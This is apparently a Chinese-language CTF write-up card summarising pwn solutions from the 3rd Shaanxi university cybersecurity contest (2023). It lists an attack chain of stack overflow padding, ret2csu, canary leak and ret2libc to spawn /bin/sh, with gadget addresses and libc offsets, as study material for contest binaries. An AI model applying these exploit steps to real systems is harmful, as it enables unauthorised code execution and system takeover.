---
title: "第三届陕西大学生网安技能大赛部分WP"
category: pwn
tags: ["第三届陕西大学生网安技能大赛", "pwn", "陕西大学生", "数字拆解字符串", "栈溢出ret2csu", "canary泄露+ret2libc"]
signals: ["第三届陕西大学生网安技能大赛 2023", "陕西大学生", "数字拆解字符串", "栈溢出ret2csu", "canary泄露+ret2libc", "srand爆破", "pwntools", "pwn_unknown", "ret2csu", "canary", "ret2libc", "chr", "sum"]
difficulty: medium
source: "https://www.ctfiot.com/118672.html"
tools: ["pwntools"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第三届陕西大学生网安技能大赛部分WP

> 赛事：第三届陕西大学生网安技能大赛 2023 | 方向：pwn | 难度：medium | 工具：pwntools

## 一句话总结

第三届陕西大学生网安赛：数字拆解密码+栈溢出ret2csu+canary泄漏ret2libc

## 攻击链

1. 数字字符串拆分求和+chr(sum+64)→栈溢出'a'*152+ret2csu→canary泄漏+libc基址→ret2libc system(/bin/sh)

## 关键 payload

```
a='8881088410842088810810842042108108821041010882108881' 数字拆解;p64(0x00000000004005d6) ret2csu;canary leak+libcbase-171408;pop_rdi=0x0000000000400b93;system+libc+0x1d8698 /bin/sh
```

## 经验教训

数字字符串按0拆分后逐段求和+chr(sum+64)得字母；canary泄漏+ret2libc是栈溢出通用解

## 标签

陕西大学生、数字拆解字符串、栈溢出ret2csu、canary泄露+ret2libc、srand爆破、pwntools

## 参考来源

- https://www.ctfiot.com/118672.html
- 原文件：第三届陕西大学生网安技能大赛部分WP.full.md
